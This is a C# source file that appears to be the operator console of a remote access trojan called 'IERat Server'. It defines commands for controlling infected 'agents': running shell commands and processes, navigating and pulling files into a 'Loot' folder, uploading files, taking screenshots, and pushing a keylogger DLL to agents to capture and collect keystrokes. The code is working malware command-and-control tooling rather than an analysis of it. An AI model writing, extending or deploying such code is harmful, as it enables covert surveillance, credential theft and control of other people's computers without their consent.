using System;
using System.Threading;
using System.Threading.Tasks;
using NClap.Metadata;
using NClap.Repl;
using IERatServer.lib;
using NClap.Utilities;
using System.Drawing;
using Console = Colorful.Console;
using System.IO;

namespace IERatServer
{
    public class CLI
    {
        public static string ModulesFolder = Path.Combine(Directory.GetCurrentDirectory(), "Modules");
        public static string LootFolder = Path.Combine(Directory.GetCurrentDirectory(), "Loot");
        public static LoopInputOutputParameters ioParams = new()
        {
            Prompt = ColoredString.FromString("IERat$ ")
        };
        public static Loop loop = new(typeof(MyCommandType), ioParams);
        public static int InteractContext = 1;
        public static int TimeOutSeconds = 30;
        enum MyCommandType
        {
            [Command(typeof(ListCommand), Description = "List Agents")]
            agents,

            [Command(typeof(ExecuteCommand), Description = "Execute a process")]
            exec,

            [Command(typeof(TimeoutCommand), Description = "Set the agents timeout in seconds")]
            timeout,

            [Command(typeof(pwdCommand), Description = "Execute a process")]
            pwd,

            [Command(typeof(lsCommand), Description = "List the current directory")]
            ls,

            [Command(typeof(cdCommand), Description = "Change the current directory")]
            cd,

            [Command(typeof(KillCommand), Description = "Kill the agent proces")]
            kill,

            [Command(typeof(ShellCommand), Description = "Run a shell command")]
            shell,

            [Command(typeof(InteractCommand), Description = "Interact with an agent")]
            interact,

            [Command(typeof(HistoryCommand), Description = "View task history")]
            history,

            [Command(typeof(DownloadCommand), Description = "Download a file")]
            download,

            [Command(typeof(UploadCommand), Description = "Upload a file")]
            upload,

            [Command(typeof(ScreenshotCommand), Description = "Download a file")]
            screenshot,

            [Command(typeof(KeyloggerCommand), Description = "Keylogger module operations")]
            keylogger,

            [Command(typeof(ClearCommand), Description = "Clear the console text")]
            clear,

            [Command(typeof(HelpCommand), Description = "Display help")]
            help,

            [Command(typeof(ExitCommand2), Description = "Exits the shell")]
            exit
        }

        class ListCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                Console.ForegroundColor = Color.Yellow;
                Db.ListChannels();
                Console.ForegroundColor = Color.White;
                return Task.FromResult(CommandResult.Success);
            }
        }

        class ExitCommand2 : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                Logger.Log("info", "Killing Server");
                Environment.Exit(1);
                return Task.FromResult(CommandResult.Success);
            }
        }

        class ClearCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                Console.Clear();
                return Task.FromResult(CommandResult.Success);
            }
        }

        class ScreenshotCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("screenshot");
                return Task.FromResult(CommandResult.Success);
            }
        }

        class ShellCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "a shell command to execute")]
            public string shellCommand { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("shell", shellCommand);
                return Task.FromResult(CommandResult.Success);
            }
        }
        class KeyloggerCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "keylogger opertation")]
            public string Operation { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
                var agent = ActiveChannel.agent;

                switch (Operation)
                {
                    case "start":
                        if (agent.LoadedModules.ContainsKey("klog"))  {
                            AddTaskToActiveAgent("klog_start", "");
                        }
                        else
                        {
                            try
                            {
                                var KlogModule = File.ReadAllBytes(Path.Combine(ModulesFolder, "KeyLogModule.dll"));
                                AddTaskToActiveAgent("klog_start", Convert.ToBase64String(ServerUtils.Compress(KlogModule)));
                                agent.LoadedModules.Add("klog", null);
                            }
                            catch
                            {
                                Console.WriteLine("Error - Unable to load keylogger module - KeyLogModule.dll was not found in Modules folder");
                                Logger.Log("error", "Unable to load keylogger module - KeyLogModule.dll was not found in Modules folder");
                            }
                        }
                        return Task.FromResult(CommandResult.Success);
                    case "stop":
                        AddTaskToActiveAgent("klog_stop");
                        agent.LoadedModules.Remove("klog");
                        return Task.FromResult(CommandResult.Success);
                    case "collect":
                        AddTaskToActiveAgent("klog_collect");
                        return Task.FromResult(CommandResult.Success);
                    case "clear":
                        AddTaskToActiveAgent("klog_clear");
                        return Task.FromResult(CommandResult.Success);
                    default:
                        CLI.ScreenMessage("Bad keylogger operation choice");
                        return Task.FromResult(CommandResult.Success);
                }
            }
        }
        class DownloadCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the path for the file to download on the remote machine")]
            public string DownloadPath { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("download", DownloadPath);
                return Task.FromResult(CommandResult.Success);
            }
        }

        class UploadCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the path for the file to upload on the local machine")]
            public string FileUploadPath { get; set; }

            [PositionalArgument(ArgumentFlags.Optional, Position = 1, Description = "the path for the file to be saved on the remote machine")]
            public string RemotePath { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                if (File.Exists(FileUploadPath))
                {
                    if (RemotePath == null) { RemotePath = FileUploadPath; }
                    var FileBytes = File.ReadAllBytes(FileUploadPath);
                    var payload = Convert.ToBase64String(ServerUtils.Compress(FileBytes));
                    AddTaskToActiveAgent("upload", payload + ":::" + RemotePath);
                    return Task.FromResult(CommandResult.Success);
                }
                else
                {
                    Console.ForegroundColor = Color.LightBlue;
                    Console.WriteLine($"\nError - File not found.\n");
                    Console.ForegroundColor = Color.White;
                    //loop._client.DisplayPrompt();
                    return Task.FromResult(CommandResult.Success);
                }
            }
        }

        class lsCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("ls");
                return Task.FromResult(CommandResult.Success);
            }
        }

        class TimeoutCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the number of seconds")]
            public int seconds { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                TimeOutSeconds = seconds;
                return Task.FromResult(CommandResult.Success);
            }
        }

        class cdCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "a directory path")]
            public string directory { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("cd", directory);
                return Task.FromResult(CommandResult.Success);
            }
        }
        class pwdCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("pwd");
                return Task.FromResult(CommandResult.Success);
            }
        }
        class HistoryCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                Console.ForegroundColor = Color.Yellow;
                Db.ListTasks();
                Console.ForegroundColor = Color.White;
                return Task.FromResult(CommandResult.Success);
            }
        }

        class ExecuteCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the process path")]
            public string ProcessPath { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("execute", ProcessPath);
                return Task.FromResult(CommandResult.Success);
            }
        }
        class KillCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                AddTaskToActiveAgent("kill");
                return Task.FromResult(CommandResult.Success);
            }
        }
        class InteractCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the agent number from the agents table")]
            public int AgentNumber { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                InteractContext = AgentNumber;
                if (Db.ChannelExists(AgentNumber)) {
                    Colorful.Console.ForegroundColor = Color.Blue;
                    Colorful.Console.WriteLine($"\nInteracting with agent #{InteractContext}\n");
                    Colorful.Console.ForegroundColor = Color.White;

                    AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
                    var agent = ActiveChannel.agent;
                    Logger.Log("info", $"Interacting with agent {agent.ID}");
                    if (ActiveChannel != null) {
                        ColoredString test = new()
                        {
                            BackgroundColor = ConsoleColor.DarkCyan,
                            ForegroundColor = ConsoleColor.White,
                            Content = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ "
                        };
                        loop._client.Prompt = test;
                    }
                }
                else {
                    Colorful.Console.ForegroundColor = Color.Blue;
                    Colorful.Console.WriteLine("\nBad ID number!\n");
                    Colorful.Console.ForegroundColor = Color.White;
                }

                return Task.FromResult(CommandResult.Success);
            }
        }
        public static void RunInteractiveShell()
        {
            Console.WriteLine(Figgle.FiggleFonts.CyberLarge.Render("IERat Server"), Color.LightYellow);
            Colorful.StyleSheet styleSheet = new(Color.White);
            Console.WriteLineStyled($"\t\t\t\tPowered by Internet Explorer!\t\n\n", styleSheet);
            //Console.WriteWithGradient("\t\t\t\tPowered by Internet Explorer!\t\n\n", Color.White, Color.LightSkyBlue, 24);

            if (!Directory.Exists(ModulesFolder)) { Directory.CreateDirectory(ModulesFolder); }
            if (!Directory.Exists(LootFolder)) { Directory.CreateDirectory(LootFolder); }

            loop.Execute();
        }
        public static void AddTaskToActiveAgent(string type, string args = "")
        {
            TaskObject taskObject = new()
            {
                Type = type,
                args = args,
                Time = DateTime.Now.ToString()
            };
            AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
            if (ActiveChannel != null) { ActiveChannel.agent.AgentTasks.Enqueue(taskObject); }
        }
        public static void ScreenMessage(string message)
        {
            System.Console.ForegroundColor = ConsoleColor.Blue;
            System.Console.WriteLine($"\n{message}\n");
            System.Console.ForegroundColor = ConsoleColor.White;
            loop._client.DisplayPrompt();
        }
    }
}
